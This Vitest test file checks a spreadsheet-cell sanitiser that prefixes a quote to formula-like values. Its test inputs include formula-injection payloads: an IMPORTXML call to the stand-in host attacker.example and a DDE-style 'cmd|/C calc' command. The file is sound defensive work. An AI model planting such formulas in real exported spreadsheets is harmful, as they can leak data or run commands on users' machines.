import { describe, expect, it } from 'vitest';
import { safeSpreadsheetCell } from '../spreadsheetSafety';

describe('safeSpreadsheetCell', () => {
  it('neutralizes formula-like cell values after leading whitespace or control characters', () => {
    expect(safeSpreadsheetCell('=IMPORTXML("https://attacker.example","//a")')).toBe(
      '\'=IMPORTXML("https://attacker.example","//a")',
    );
    expect(safeSpreadsheetCell(' +SUM(1,1)')).toBe("' +SUM(1,1)");
    expect(safeSpreadsheetCell('\t-cmd|/C calc')).toBe("'\t-cmd|/C calc");
    expect(safeSpreadsheetCell('\r@attacker.example')).toBe("'\r@attacker.example");
  });

  it('leaves ordinary values unchanged', () => {
    expect(safeSpreadsheetCell('Yale Research')).toBe('Yale Research');
    expect(safeSpreadsheetCell(null)).toBe('');
  });
});
